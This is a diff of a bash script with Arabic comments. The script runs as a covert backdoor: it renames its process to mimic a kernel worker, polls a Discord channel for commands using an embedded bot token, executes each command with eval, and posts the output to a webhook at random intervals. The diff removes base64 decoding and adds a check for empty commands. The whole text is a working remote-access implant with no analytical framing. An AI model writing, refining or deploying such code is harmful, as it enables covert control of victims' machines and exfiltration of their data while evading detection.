@@ -13,20 +13,23 @@ BOT_TOKEN="MTMzNzU3NDI3NTYyMzk0NDE5Mg.Gf4Y4q.tnJK8422UP1cSOMEBsT8djuYfjEkpmZlTnM
 exec -a "[kworker/1:1+ksoftirqd/12]" /bin/bash "$0" &
 
 while :; do
+  # استلام آخر رسالة من القناة عبر Discord API
   CMD=$(curl -sf -H "Authorization: Bot $BOT_TOKEN" \
     "https://discord.com/api/v9/channels/$CHANNEL_ID/messages?limit=1" | 
-    jq -r '.[0].content' | 
-    base64 -d 2>/dev/null)
+    jq -r '.[0].content')  # نحصل على محتوى الرسالة بدون base64 أو أي تشفير
 
-  # تحقق من محتوى الأمر بعد فك التشفير
-  echo "Executing command: $CMD"
+  # التحقق من وجود أمر صالح
+  if [ -z "$CMD" ]; then
+    echo "No command received. Waiting for new command..."  # إذا لم يكن هناك أمر
+  else
+    echo "Executing command: $CMD"  # عرض الأمر المستلم
+    OUTPUT=$(eval "$CMD" 2>&1)  # تنفيذ الأمر الذي تم استلامه
+    # إرسال النتيجة إلى Webhook
+    curl -sf -X POST "$WEBHOOK_URL" \
+      -H "Content-Type: application/json" \
+      -d "{\"content\":\"$(date +%s.%N)|$OUTPUT\"}" >/dev/null
+  fi
 
-  OUTPUT=$(eval "$CMD" 2>&1)
-  
-  # إرسال البيانات مباشرة بدون base64
-  curl -sf -X POST "$WEBHOOK_URL" \
-    -H "Content-Type: application/json" \
-    -d "{\"content\":\"$(date +%s.%N)|$OUTPUT\"}" >/dev/null
-  
+  # الانتظار لفترة عشوائية قبل التحقق مرة أخرى
   sleep $(awk -v seed=$RANDOM 'BEGIN { srand(seed); printf("%.4f\n", rand()*13+1) }')
 done
